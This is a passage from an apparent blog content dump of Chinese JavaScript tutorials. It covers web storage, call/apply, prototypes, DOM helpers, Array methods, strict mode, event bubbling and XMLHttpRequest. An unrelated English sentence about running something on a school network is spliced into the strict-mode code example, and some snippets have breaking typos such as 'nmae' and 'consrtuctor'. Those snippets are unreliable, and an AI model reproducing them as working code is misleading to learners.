区别：cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递。而sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下。存储大小限制也不同，cookie数据不能超过4k，同时因为每次http请求都会携带cookie，所以cookie只适合保存很小的数据，如会话标识。sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。数据有效期不同，sessionStorage：仅在当前浏览器窗口关闭前有效，自然也就不可能持久保持；localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；cookie只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。作用域不同，sessionStorage不在不同的浏览器窗口中共享，即使是同一个页面；localStorage 在所有同源窗口中都是共享的；cookie也是在所有同源窗口中都是共享的。Web Storage 支持事件通知机制，可以将数据更新的通知发送给监听者。Web Storage 的 api 接口使用更方便。 indexDB ​ IndexedDB是为了能够在客户端存储大量的结构化数据，并且使用索引高效检索的API","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"函数的四种调用模式","date":"2016-05-20T11:33:21.000Z","path":"2016/05/20/函数的四种调用模式/","text":"函数模式 方法模式 构造函数模式 上下文模式 函数模式特征: 就是一个简单的函数调用. 函数名的前面没有任何引导内容. 12345function foo () &#123;&#125;var func = function () &#123;&#125;;foo();func();(function ()&#123;&#125;)(); this 的含义: 在 函数中 this 表示全局对象, 在浏览器中是 window 方法模式特征: 方法一定是依附于一个对象, 将函数赋值给对象的一个属性, 那么就成为了方法. 123456function f() &#123; this.method = function () &#123;&#125;;&#125;var o = &#123; method: function () &#123;&#125; &#125; this 的含义: 这个依附的对象. 构造函数调用模式12345678910111213 function Person() &#123;&#125; var tom = new Person(); // 这就是构造器函数的调用 // 构造函数调用的详细过程 // 1 会在内部创建一个对象o // 2 给对象赋值(this), 然后执行各种操作 // 3 返回这个对象o // 构造函数的返回值：// 有一个默认的返回值，新创建的对象（实例）；// 当手动添加返回值后（return语句）：// 1. 返回值是基本数据类型--&gt;真正的返回值还是那个新创建的对象（即实例）// 2. 返回值是复杂数据类型（对象）--&gt;真正的返回值是这个对象 上下文调用模型上下文 就是环境, 就是自定义设置 this 的含义 语法: 函数名.apply( 对象, [ 参数 ] ); 函数名.call( 对象, 参数 ); 定义1、call/apply定义在Function.prototype上 2、call/apply方法可以实现函数的调用，并且可以指定函数内部的this的值 call方法第一个参数为null/undefined,函数内部的this指向window call方法的第一个参数是一个数字、字符串、布尔值，函数内部的this指向他们对应的基本包装类型的对象 call方法的第一个参数是一个对象，函数内部的this指向该对象 3、call/apply方法的不同点：给函数传递实参的方式不同其他都相同 应用场景 借用构造函数实现继承 12345678910111213141516171819//借用构造函数实现继承：已知构造函数A/B，如果A中的代码可以完全适用于B，只需要在B中通过上下文模式借用A function Animal(name,color,age)&#123; this.name=name; this.color=color; this.age=age; &#125; function Dog(name,color,age)&#123; //Animal构造函数中的代码正好可以完全适用于Dog构造函数 Animal.call(this,name,color,age); Animal.call(this,arguments);//高级有B格的写法// this.name=name;// this.color=color;// this.age=age; &#125; Dog.prototype.cry=function()&#123; console.log(\"cry\"); &#125; 借用Math.max实现计算数组的最大值 12var reslut = Math.max.apply(Math,[1,2,3,4,8,5,6,4])console.log(reslut) 借用数组的push方法 12345678910var a = &#123; length: 0 &#125;; // 伪数组a[ a.length++ ] = 'abc'; // a[ 0 ] = 'abc'; a.length++;a[ a.length++ ] = 'def';// 使用一个空数组, 将元素一个个放到数组中即可var arr = [];arr.push( a ); arr.push.apply( arr, a );// 利用 apply 可以展开伪数组的特性, 这里就相当于 arr.push( a[0], a[1] ) 借用数组的slice方法 12345 var a = &#123; length: 0 &#125;; a[ a.length++ ] = 'abc'; a[ a.length++ ] = 'def'; [].slice.apply( a, [ 0 ] );console.log(a); 借用Object.prototype.toString检测数据类型 123456789101112 var class2type = &#123;&#125;;//属性名称：toString的返回值:\"[object Xxxx]\" 属性的值：type返回值 var types = \"Number String Boolean RegExp Array Function Object Math Date\".split(\" \"); for (var i = 0; i &lt; types.length; i++) &#123; var type = types[i]; class2type[\"[object \" + type + \"]\"] = type.toLowerCase(); &#125;function type (data) &#123; return data == null ? String(data) : class2type[toString.call(data)]; &#125;type(\"aaa\") // =&gt; string","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"js逻辑运算符","date":"2016-05-11T03:33:21.000Z","path":"2016/05/11/逻辑运算符的应用/","text":"在js中运算符号的优先级 运算符 描述 . [] () 字段访问、数组下标、函数调用以及表达式分组 ++ – - ~ ! delete new typeof void 一元运算符、返回数据类型、对象创建、未定义值 * / % 乘法、除法、取模 + - + 加法、减法、字符串连接 &lt;&lt; &gt;&gt; &gt;&gt;&gt; 移位 &lt; &lt;= &gt; &gt;= instanceof 小于、小于等于、大于、大于等于、instanceof == != === !== 等于、不等于、严格相等、非严格相等 &amp; 按位与 ^ 按位异或 \\ 按位或 &amp;&amp; 逻辑与 \\ \\ 逻辑或 ?: 条件 = oP= 赋值、运算赋值 , 多重求值 场景1 12345678910111213141516var a = 0; if(a == 5)&#123; a = 1; &#125; else if(a == 10)&#123; a = 2; &#125; else if(a == 12)&#123; a = 3; &#125; else if(a == 15)&#123; a = 4; &#125; else &#123; a = 0; &#125; 优化后 1var a = ( a ==5 &amp;&amp; 1) || ( a ==10 &amp;&amp; 2) || (a ==12 &amp;&amp; 3) || (a ==15 &amp;&amp; 4) || 0; 场景2 1e = e || window.event 场景3 1a&gt;b &amp;&amp; (a=&gt;&#123;console.log(a)&#125;) 注意 () 必须加上否则报错","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"Don操作相关","date":"2016-05-04T12:58:48.000Z","path":"2016/05/04/dom相关/","text":"dom结构图 选择器 获取元素(选择器) 12345678910111213141516\\\\没有兼容问题;document.getElementById();document.getElementsByClassName();//h5新增document.getElementsByTagName();document.getElementsByName();\\\\css3选择器document.querySelector();document.querySelectorAll();//下面代码有兼容问题,封装兼容代码;this.firstElementChild//获取第一个子元素zthis.lastElementChild//获取最后一个子元素； this.nextElementSibling//获取后一个兄弟元素; this.previousElementSibling//获取第一个兄弟元素; 获取第一个子元素兼容代码 1234567891011121314function getFirstElement(element) &#123; if (element.firstElementChild) &#123; //浏览器如果支持这个属性则直接返回第一个子元素 return element.firstElementChild; &#125; else &#123;//浏览器不支持firstElementChild属性 var node = element.firstChild;//获取父元素中的第一个子节点 //如果node不为空,并且node的类型是1,则证明是一个标签,如果不是则继续找后面的子节点 while (node &amp;&amp; node.nodeType != 1) &#123; node = node.nextSibling;//当前子节点的下一个节点 &#125; //如果循环结束,表示node中存储的是一个标签节点 return node; &#125;&#125; 获取最后一个子元素兼容代码 123456789101112function getLastElement(element) &#123; if (element.lastElementChild) &#123;//浏览器支持这个属性则直接返回 return element.lastElementChild; &#125; else &#123;//浏览器不支持这个属性 var node = element.lastChild; while (node &amp;&amp; node.nodeType != 1) &#123; //这个节点不是标签,继续向前找节点 node = node.previousSibling; &#125; return node; &#125;&#125; 获取当前元素的后一个兄弟元素 1234567891011function getNextElement(element) &#123; if (element.nextElementSibling) &#123; return element.nextElementSibling; &#125; else &#123; var node = element.nextSibling; while (node &amp;&amp; node.nodeType != 1) &#123; node = node.nextSibling; &#125; return node; &#125;&#125; 获取当前元素的前一个兄弟元素 123456789101112function getPreviousElement(element) &#123; if (element.previousElementSibling) &#123; return element.previousElementSibling; &#125; else &#123; var node = element.previousSibling; while (node &amp;&amp; node.nodeType != 1) &#123; node = node.previousSibling; &#125; return node; &#125;&#125; 获取当前元素的所有的兄弟元素 123456789101112131415161718function getSiblingElement(element) &#123; var elements = [];//保存当前元素的前面所有元素和后面所有元素 var ele = element.previousSibling; while (ele) &#123; if (ele.nodeType == 1) &#123; elements.push(ele); &#125; ele = ele.previousSibling; &#125; ele = element.nextSibling; while (ele) &#123; if (ele.nodeType == 1) &#123; elements.push(ele); &#125; ele = ele.nextSibling; &#125; return elements;&#125; ###","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"Array常用方法","date":"2016-04-10T10:58:48.000Z","path":"2016/04/10/Array常用方法/","text":"splice1array.splice(start, deleteCount, item1, item2, ...) 12myFish.splice(2, 1, \"splice\", \"parrot\");// myFish is [\"angel\", \"clown\", \"splice\", \"parrot\", \"sturgeon\"] 参数 start 指定修改的开始位置（从0计数）。如果超出了数组的长度，则从数组末尾开始添加内容；如果是负值，则表示从数组末位开始的第几位。 deleteCount 可选 整数，表示要移除的数组元素的个数。如果 deleteCount 是 0，则不移除元素。这种情况下，至少应添加一个新元素。如果 deleteCount大于start 之后的元素的总数，则从 start 后面的元素都将被删除（含第 start 位）。 如果deleteCount被省略，则其相当于(arr.length - start)。 item1, item2, *...* 可选 要添加进数组的元素,从start 位置开始。如果不指定，则 splice()将只删除数组元素。 返回值 由被删除的元素组成的一个数组。如果只删除了一个元素，则返回只包含一个元素的数组。如果没有删除元素，则返回空数组。 filter()ilter()方法使用指定的函数测试所有元素，并创建一个包含所有通过测试的元素的新数组。 例子 123456789101112131415function isBigEnough(value) &#123; return value &gt;= 10;&#125;var filtered = [12, 5, 8, 130, 44].filter(isBigEnough);// filtered is [12, 130, 44]var arr = [12,22,123,456,82,123,42,5421,512,123];var filteredOne = arr.filter(function(element)&#123; console.log(this) // arr的对象 if(element&gt;=10)&#123; return true; &#125;&#125;,arr) 语法 1var new_arrary = arr.filter(callback[, thisArg]) 参数 callback 用来测试数组的每个元素的函数。调用时使用参数 (element, index, array)。返回true表示保留该元素（通过测试），false则不保留。 thisArg 可选。执行 callback 时的用于 this 的值。 返回值 一个新的通过测试的元素的集合的数组 filter 不会改变原数组。只能筛选数组元素 find**find()** 方法返回数组中满足提供的测试函数的第一个元素的值。否则返回 undefined。 12345function isBigEnough(element) &#123; return element &gt;= 15;&#125;[12, 5, 8, 130, 44].find(isBigEnough); // 130 另请参见 findIndex() 方法，它返回数组中找到的元素的索引，而不是其值。 如果你需要找到一个元素的位置或者一个元素是否存在于数组中，使用Array.prototype.indexOf() 或 Array.prototype.includes()。 语法 1arr.find(callback[, thisArg]) 参数 callback 在数组每一项上执行的函数，接收 3 个参数：element当前遍历到的元素。index当前遍历到的索引。array数组本身。 thisArg 可选，指定 callback 的 this 参数。 find 不会改变原数组。只能选择第一个满足条件的数组元素返回 forEach()**forEach()** 方法对数组的每个元素执行一次提供的函数(回调函数)。 语法 1array.forEach(callback[, thisArg]) 参数 callback 函数为每个元素执行，接收三个参数： currentValue(当前值)数组中正在处理的当前元素。index(索引)数组中正在处理的当前元素的索引。array正在应用forEach()数组。。 thisArg可选 可选参数。当执行回调 函数时用作`this的`值(参考对象)。 返回值undefined forEach 方法按升序为数组中含有效值的每一项执行一次callback 函数，那些已删除（使用delete方法等情况）或者未初始化的项将被跳过（但不包括那些值为 undefined 的项）（例如在稀疏数组上）。 123456789101112131415161718192021222324252627282930function logArrayElements(element, index, array) &#123; console.log(\"a[\" + index + \"] = \" + element);&#125;// 注意索引2被跳过了，因为在数组的这个位置没有项[2, 5, ,9].forEach(logArrayElements);// logs:// a[0] = 2// a[1] = 5// a[3] = 9function Counter() &#123; this.sum = 0; this.count = 0;&#125;Counter.prototype.add = function(array) &#123; array.forEach(function(entry) &#123; this.sum += entry; ++this.count; &#125;, this);//改变foreach内的this的指向 // ^---- 注意&#125;;var obj = new Counter();obj.add([2, 5, 9]);obj.count// 3 obj.sum// 16 map方法123456789var arr = [1,23,4,56,75,237,54,85,4];//遍历数组 返回新的数组 会对每一个值进行返回 不返回明确的值为undefinedvar arr2 = arr.map(function (value)&#123; if(value&gt;= 20 )&#123; return value &#125;&#125;,this) //可以改变函数内部this的指向console.log(arr2) //[undefined, 23, undefined, 56, 75, 237, 54, 85, undefined] every方法123456var arr = [1,23,4,56,75,237,54,85,4];//返回boolean 值 都为true就返回true 否则返回 falsevar arr3 = arr.every(function (value,index)&#123; return typeof value ===\"number\";&#125;,this) //可以改变函数内部this的指向console.log(arr3) //true 因为都是number 的类型 filter方法123456789var arr = [1,23,4,56,75,237,54,85,4];//筛选对需要返回元素返回 true 返回的元素组成新的arrvar arr4 = arr.filter(function (value,index)&#123; if(index&gt;= 3 )&#123; return true &#125;&#125;,this) //可以改变函数内部this的指向console.log(arr4) //返回大于3索引的所有元素组成的数组//[56, 75, 237, 54, 85, 4] find 和findIndex 和indexof12345678910111213141516var arr = [1,23,4,56,75,237,54,85,4];//查找返回元素 如果不存在 返回undefined 返回第一个var arr5 = arr.find(function (value,index)&#123; return value === 20 || index ===5&#125;,this) //可以改变函数内部this的指向console.log(arr5)//237 // 查找元素的索引 找到返回元素的索引 没有返回-1 返回第一个;var arr6 = arr.findIndex(function (value,index)&#123; return value === 20&#125;,this) //可以改变函数内部this的指向console.log(arr6)//-1//第一个参数是要找的值 第二第三参数表示范围var arr7 = arr.indexOf(4,5,-1);console.log(arr7)//8","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"js中的call和apply","date":"2016-04-07T00:58:48.000Z","path":"2016/04/07/call和apply/","text":"##方法的定义 call方法 : 语法：原始的对象call([需要指向的对象,参数1,参数2——参数n) 说明： 改变this的指向吧原始对象中的this指向需要指向的对象,从第二个参数开始都为传递的参数 apply方法: 语法：原始的对象call([需要指向的对象,[参数1,参数2——参数n]) 说明:与call方法的作用相同只是传递参数的方式不一样apply以数组形式传递参数 2、常用实例 a例 12345678910function add(a,b)&#123; alert(a+b);&#125;function sub(a,b)&#123; alert(a-b);&#125;add.call(sub,3,1); 这个例子中的意思就是用 add 来替换 sub，add.call(sub,3,1) == add(3,1) ，所以运行结果为：alert(4); // 注意：js 中的函数其实是对象，函数名是对 Function 对象的引用。实质上改变add函数内部的this指向,把this指向sub b例 123456789101112131415161718function Animal()&#123; this.name = \"Animal\"; this.showName = function()&#123; alert(this.name); &#125; &#125; function Cat()&#123; this.name = \"Cat\"; &#125; var animal = new Animal(); var cat = new Cat(); //通过call或apply方法，将原本属于Animal对象的showName()方法交给对象cat来使用了。 //输入结果为\"Cat\" animal.showName.call(cat,\",\"); //animal.showName.apply(cat,[]); call 的意思是把 animal 的方法放到cat上执行，原来cat是没有showName() 方法，现在是把animal 的showName()方法放到 cat上来执行，所以this.name 是 Cat 借用其他对象的方法 c、实现继承 12345678910111213function Animal(name)&#123; this.name = name; this.showName = function()&#123; alert(this.name); &#125; &#125; function Cat(name)&#123; Animal.call(this, name); &#125; var cat = new Cat(\"Black Cat\"); cat.showName(); d、多重继承 123456789101112131415161718192021function Class10()&#123; this.showSub = function(a,b) &#123; alert(a-b); &#125;&#125;function Class11()&#123; this.showAdd = function(a,b) &#123; alert(a+b); &#125;&#125;function Class2()&#123; Class10.call(this); Class11.call(this);&#125; 很简单，使用两个 call 就实现多重继承了当然，js的继承还有其他方法，例如使用原型链，只是在此说明call 的用法。说了call ，当然还有 apply，这两个方法是一个意思，区别在于 call 的第二个参数可以是任意类型，而apply的第二个参数必须是数组，也可以是arguments还有 callee，caller.. 例子来源：http://xiaofeizm55333.iteye.com/blog/80913 http://www.iteye.com/topic/599108","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"原型与原型对象","date":"2016-04-07T00:58:48.000Z","path":"2016/04/07/原型与原型链/","text":"构造函数与实例的关系 原型链简单原理图 原型链 123456789function Person()&#123;&#125; var p1=new Person(); //p1可以访问到自身的内存 //p1还可以访问到p1.__proto__ //p1还可以访问到p1.__proto__.__proto__ //。。。。。 //一直可以访问到原型链的顶端(__proto__:null) //我们把不同的对象之间通过__proto__属性来进行连接，可以通过这样的关系来访问他们的属性，他们形成的这种关系仿佛就是一个链子的结构，我们把这样的链子称之为原型链 对象的原型链1var obj = &#123;name:\"万翼峰\"&#125;; 构造函数 原型 实例之间的关系 基本包装类型原型链(字符串,数组) 12345var str = \"abc\";str.indexOf(\"b\");//发生装箱 产生基本包装类型var str1 = new String(\"abc\");str1.indexOf(\"b\"); 自定义构造函数原型链 12var Fn = function ()&#123;&#125;var f = new Fn(); 稍微复杂案例12345678910function Car (name)&#123; this.name = nmae; &#125; Car.prototype = &#123; consrtuctor:Car, run:function()&#123; console.log(\"run\") &#125; &#125; var bn = new Car(\"宝马\"); 函数的原型图 完整版原型图","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"获取当前元素的后一个元素","date":"2016-04-05T03:40:44.000Z","path":"2016/04/05/获取后一个元素/","text":"12345678910111213 //获取当前元素的后一个元素 function getNextElement(element) &#123; if(element.nextElementSibling)&#123; return element.nextElementSibling; &#125;else&#123; var ele=element.nextSibling; while(ele&amp;&amp;ele.nodeType!==1)&#123; ele=ele.nextSibling; &#125; return ele; &#125; &#125;&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"能力检测","slug":"能力检测","permalink":"http://www.wanyifeng.top/tags/能力检测/"}]},{"title":"命名空间、私有变量","date":"2016-03-05T13:03:21.000Z","path":"2016/03/05/命名空间、私有变量/","text":"###对象的字面量12345678var namespace1 = &#123; a: function() &#123; alert(1); &#125;, b: function() &#123; alert(2); &#125;&#125;; 把a 和b 都定义为namespace1 的属性，这样可以减少变量和全局作用域打交道的机会 ###动态创建命名空间12345678910111213141516171819202122var MyApp = &#123;&#125;;MyApp.namespace = function(name) &#123; var parts = name.split('.'); var current = MyApp; for(var i in parts) &#123; if(!current[parts[i]]) &#123; current[parts[i]] = &#123;&#125;; &#125; current = current[parts[i]]; &#125;&#125;;MyApp.namespace('event');MyApp.namespace('dom.style');console.dir(MyApp);// 上述代码等价于：var MyApp = &#123; event: &#123;&#125;, dom: &#123; style: &#123;&#125; &#125;&#125;; 命名空间提供避免元素命名冲突的方法。把它想象成一个对象 变量相当于key 一个对象只能有唯一的key 为了解决多个同名变量才产生了命名空间的概念 ###使用闭包封装私有变量 123456789var user = (function() &#123; var __name = 'sven', __age = 29; return &#123; getUserInfo: function() &#123; return __name + '-' + __age; &#125; &#125;&#125;)(); 只有当前user作用域内可以访问,不会污染全局变量,一般私有变量命名时前缀加上”_”区别其他变量,利用闭包实现全局变量的弊端就是内存泄漏定位问题一般解决方案为手动释放把私有变量的值赋值为NULL ,在ES6种出现块级作用域可以解决这一弊端","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"js严格模式","date":"2016-03-05T00:18:11.000Z","path":"2016/03/05/js严格模式/","text":"作者： 阮一峰 日期： 2013年1月14日 一、概述 除了正常运行模式，ECMAscript 5添加了第二种运行模式：“严格模式”（strict mode）。顾名思义，这种模式使得Javascript在更严格的条件下运行。 设立”严格模式”的目的，主要有以下几个：1234567 - 消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为; - 消除代码运行的一些不安全之处，保证代码运行的安全； - 提高编译器效率，增加运行速度； - 为未来新版本的Javascript做好铺垫。 “严格模式”体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经支持它，许多大项目已经开始全面拥抱它。 另一方面，同样的代码，在”严格模式”中，可能会有不一样的运行结果；一些在”正常模式”下可以运行的语句，在”严格模式”下将不能运行。掌握这些内容，有助于更细致深入地理解Javascript，让你变成一个更好的程序员。 本文将对”严格模式”做详细介绍。 二、进入标志 进入”严格模式”的标志，是下面这行语句：1 \"use strict\"; 老版本的浏览器会把它当作一行普通字符串，加以忽略。 三、如何调用 “严格模式”有两种调用方法，适用于不同的场合。 3.1 针对整个脚本文件 将”use strict”放在脚本文件的第一行，则整个脚本都将以”严格模式”运行。如果这行语句不在第一行，则无效，整个脚本以”正常模式”运行。如果不同模式的代码文件合并成一个文件，这一点需要特别注意。 (严格地说，只要前面不是产生实际运行结果的语句，”use strict”可以不在第一行，比如直接跟在一个空的分号后面。)12345678 &lt;script \"use strict\"; console.log(\"这是严格模式。\"); &lt;/script &lt;script console.log(\"这是正常模式。\");kly, it's almost 2 years ago now. I can admit it now - I run it on my school's network that has about 50 computers. &lt;/script 上面的代码表示，一个网页中依次有两段Javascript代码。前一个script标签是严格模式，后一个不是。 3.2 针对单个函数 将”use strict”放在函数体的第一行，则整个函数以”严格模式”运行。12345678 function strict()&#123; \"use strict\"; return \"这是严格模式。\"; &#125; function notStrict() &#123; return \"这是正常模式。\"; &#125; 3.3 脚本文件的变通写法 因为第一种调用方法不利于文件合并，所以更好的做法是，借用第二种方法，将整个脚本文件放在一个立即执行的匿名函数之中。12345 (function ()&#123; \"use strict\"; // some code here &#125;)(); 四、语法和行为改变 严格模式对Javascript的语法和行为，都做了一些改变。 4.1 全局变量显式声明 在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。123456\"use strict\"; v = 1; // 报错，v未声明 for(i = 0; i &lt; 2; i++) &#123; // 报错，i未声明 &#125; 因此，严格模式下，变量都必须先用var命令声明，然后再使用。 4.2 静态绑定 Javascript语言的一个特点，就是允许”动态绑定”，即某些属性和方法到底属于哪一个对象，不是在编译时确定的，而是在运行时（runtime）确定的。 严格模式对动态绑定做了一些限制。某些情况下，只允许静态绑定。也就是说，属性和方法到底归属哪个对象，在编译阶段就确定。这样做有利于编译效率的提高，也使得代码更容易阅读，更少出现意外。 具体来说，涉及以下几个方面。 （1）禁止使用with语句 因为with语句无法在编译时就确定，属性到底归属哪个对象。1234567 \"use strict\"; var v = 1; with (o)&#123; // 语法错误 v = 2; &#125; （2）创设eval作用域 正常模式下，Javascript语言有两种变量作用域（scope）：全局作用域和函数作用域。严格模式创设了第三种作用域：eval作用域。 正常模式下，eval语句的作用域，取决于它处于全局作用域，还是处于函数作用域。严格模式下，eval语句本身就是一个作用域，不再能够生成全局变量了，它所生成的变量只能用于eval内部。1234567 \"use strict\"; var x = 2; console.info(eval(\"var x = 5; x\")); // 5 console.info(x); // 2 4.3 增强的安全措施 （1）禁止this关键字指向全局对象12345678910 function f()&#123; return !this; &#125; // 返回false，因为\"this\"指向全局对象，\"!this\"就是false function f()&#123; \"use strict\"; return !this; &#125; // 返回true，因为严格模式下，this的值为undefined，所以\"!this\"为true。 因此，使用构造函数时，如果忘了加new，this不再指向全局对象，而是报错。123456789 function f()&#123; \"use strict\"; this.a = 1; &#125;; f();// 报错，this未定义 （2）禁止在函数内部遍历调用栈1234567891011 function f1()&#123; \"use strict\"; f1.caller; // 报错 f1.arguments; // 报错 &#125; f1(); 4.4 禁止删除变量 严格模式下无法删除变量。只有configurable设置为true的对象属性，才能被删除。123456789101112 \"use strict\"; var x; delete x; // 语法错误 var o = Object.create(null, &#123;'x': &#123; value: 1, configurable: true &#125;&#125;); delete o.x; // 删除成功 4.5 显式报错 正常模式下，对一个对象的只读属性进行赋值，不会报错，只会默默地失败。严格模式下，将报错。123456 \"use strict\"; var o = &#123;&#125;; Object.defineProperty(o, \"v\", &#123; value: 1, writable: false &#125;); o.v = 2; // 报错 严格模式下，对一个使用getter方法读取的属性进行赋值，会报错。1234567 \"use strict\"; var o = &#123; get v() &#123; return 1; &#125; &#125;; o.v = 2; // 报错 严格模式下，对禁止扩展的对象添加新属性，会报错。1234567 \"use strict\"; var o = &#123;&#125;; Object.preventExtensions(o); o.v = 1; // 报错 严格模式下，删除一个不可删除的属性，会报错。123 \"use strict\"; delete Object.prototype; // 报错 4.6 重名错误 严格模式新增了一些语法错误。 （1）对象不能有重名的属性 正常模式下，如果对象有多个重名属性，最后赋值的那个属性会覆盖前面的值。严格模式下，这属于语法错误。123456 \"use strict\"; var o = &#123; p: 1, p: 2 &#125;; // 语法错误 （2）函数不能有重名的参数 正常模式下，如果函数有多个重名的参数，可以用arguments[i]读取。严格模式下，这属于语法错误。1234567 \"use strict\"; function f(a, a, b) &#123; // 语法错误 return ; &#125; 4.7 禁止八进制表示法 正常模式下，整数的第一位如果是0，表示这是八进制数，比如0100等于十进制的64。严格模式禁止这种表示法，整数第一位为0，将报错。123 \"use strict\"; var n = 0100; // 语法错误 4.8 arguments对象的限制 arguments是函数的参数对象，严格模式对它的使用做了限制。 （1）不允许对arguments赋值1234567891011 \"use strict\"; arguments++; // 语法错误 var obj = &#123; set p(arguments) &#123; &#125; &#125;; // 语法错误 try &#123; &#125; catch (arguments) &#123; &#125; // 语法错误 function arguments() &#123; &#125; // 语法错误 var f = new Function(\"arguments\", \"'use strict'; return 17;\"); // 语法错误 （2）arguments不再追踪参数的变化123456789101112131415161718192021 function f(a) &#123; a = 2; return [a, arguments[0]]; &#125; f(1); // 正常模式为[2,2] function f(a) &#123; \"use strict\"; a = 2; return [a, arguments[0]]; &#125; f(1); // 严格模式为[2,1] （3）禁止使用arguments.callee 这意味着，你无法在匿名函数内部调用自身了。12345 \"use strict\"; var f = function() &#123; return arguments.callee; &#125;; f(); // 报错 4.9 函数必须声明在顶层 将来Javascript的新版本会引入”块级作用域”。为了与新版本接轨，严格模式只允许在全局作用域或函数作用域的顶层声明函数。也就是说，不允许在非函数的代码块内声明函数。12345678910111213 \"use strict\"; if (true) &#123; function f() &#123; &#125; // 语法错误 &#125; for (var i = 0; i &lt; 5; i++) &#123; function f2() &#123; &#125; // 语法错误 &#125; 4.10 保留字 为了向将来Javascript的新版本过渡，严格模式新增了一些保留字：implements, interface, let, package, private, protected, public, static, yield。 使用这些词作为变量名将会报错。1234567 function package(protected) &#123; // 语法错误 \"use strict\"; var implements; // 语法错误 &#125; 此外，ECMAscript第五版本身还规定了另一些保留字（class, enum, export, extends, import, super），以及各大浏览器自行增加的const保留字，也是不能作为变量名的。 五、参考链接 - MDN, Strict mode- Dr. Axel Rauschmayer，JavaScript’s strict mode: a summary- Douglas Crockford, Strict Mode Is Coming To Town （完） 转载自 http://www.ruanyifeng.com/blog/2013/01/javascript_strict_mode.html","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"js阻止事件冒泡","date":"2016-02-20T10:03:21.000Z","path":"2016/02/20/js阻止事件冒泡/","text":"原生js阻止事件冒泡 事件兼容代码 1function myfn(e)&#123; var evt = e ? e:window.event; &#125; js停止冒泡 123function myfn(e)&#123; window.event? window.event.cancelBubble = true : e.stopPropagation();&#125; js阻止默认行为 123function myfn(e)&#123; window.event? window.event.returnValue = false : e.preventDefault();&#125; 防止冒泡 的方法是e.stopPropagation()，IE则是使用window.cancelBubble = true stopPropagation也是事件对象(Event)的一个方法，作用是阻止目标元素的冒泡事件，但是会不阻止默认行为。什么是冒泡事件？如在一个按钮是绑定一个click事件，那么click事件会在它的父级元素中被触发 。stopPropagation就是阻止目标元素的事件冒泡到父级元素。 阻止默认行为 方法是e.preventDefault()，IE则是使用e.returnValue = false; return false javascript的return false只会阻止默认行为，而是用jquery的话则既阻止默认行为又防止对象冒泡 jquery阻止事件冒泡 提供了两种方式来阻止事件冒泡。 12345678910111213//方式一：event.stopPropagation(); $(\"#div1\").mousedown(function(event)&#123; event.stopPropagation(); &#125;);//方式二：return false; $(\"#div1\").mousedown(function(event)&#123; return false; &#125;); 但是这两种方式是有区别的。return false 不仅阻止了事件往上冒泡，而且阻止了事件本身。event.stopPropagation() 则只阻止事件往上冒泡，不阻止事件本身。","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"ajax","date":"2016-02-18T04:33:21.000Z","path":"2016/02/18/Ajax/","text":"​ 即 Asynchronous Javascript And XML，AJAX不是一门的新的语言，而是对现有持术的综合利用。 ​ 本质是在HTTP协议的基础上以异步的方式与服务器进行通信。 异步 ​ 指某段程序执行时不会阻塞其它程序执行，其表现形式为程序的执行顺序不依赖程序本身的书写顺序，相反则为同步。 ​ 其优势在于不阻塞程序的执行，从而提升整体执行效率。XMLHttpRequest可以以异步方式的处理程序。 XMLHttpRequest ​ 浏览器内建对象，用于在后台与服务器通信(交换数据) ，由此我们便可实现对网页的部分更新，而不是刷新整个页面。 由于XMLHttpRequest本质基于HTTP协议实现通信，所以结合HTTP协议和上面的例子我们分析得出如下结果 请求 HTTP请求3个组成部分与XMLHttpRequest方法的对应关系 ​1、请求行 1ajax.open('get',\"url\"); ​ 2、请求头 1setRequestHeader(\"Content-type\", \"text/html\"); ​ 3、get请求可以不设置 1ajax.send(); 响应 HTTP响应是由服务端发出的，作为客户端更应关心的是响应的结果 HTTP响应3个组成部分与XMLHttpRequest方法或属性的对应关系。 由于服务器做出响应需要时间（比如网速慢等原因），所以我们需要监听服务器响应的状态，然后才能进行处理。 1234567var ajax = new XMLHttpRequest();ajax.open('get',\"url\");ajax.send();ajax.onreadystatechange = function()&#123; if (ajax.readyState==4&amp;&amp;ajax.status==200) &#123;&#125;&#125;//onreadystatechange是Javascript的事件的一种，其意义在于监听XMLHttpRequest的状态 12345678910//1、获取状态行（包括状态码&amp;状态信息）ajax.status // 状态码ajax.statusText // 状态信息//2、获取响应头ajax.getResponseHeader(\"Content-Type\") // 获取指定头信息ajax.getAllResponseHeader() // 获取所有响应头信息//3、响应主体ajax.responseText ajax.responseXML API 123456789101112131415161718192021222324252627xhr.open()// 发起请求，可以是get、post方式xhr.setRequestHeader() //设置请求头xhr.send() //发送请求主体get方式使用xhr.send(null)xhr.onreadystatechange = function () &#123;&#125; //监听响应状态xhr.readyState = 0//UNSENT open尚未调用xhr.readyState = 1//OPENED open已调用xhr.readyState = 2//HEADERS_RECEIVED 接收到头信息xhr.readyState = 3//LOADING 接收到响应主体xhr.readyState = 4//DONE 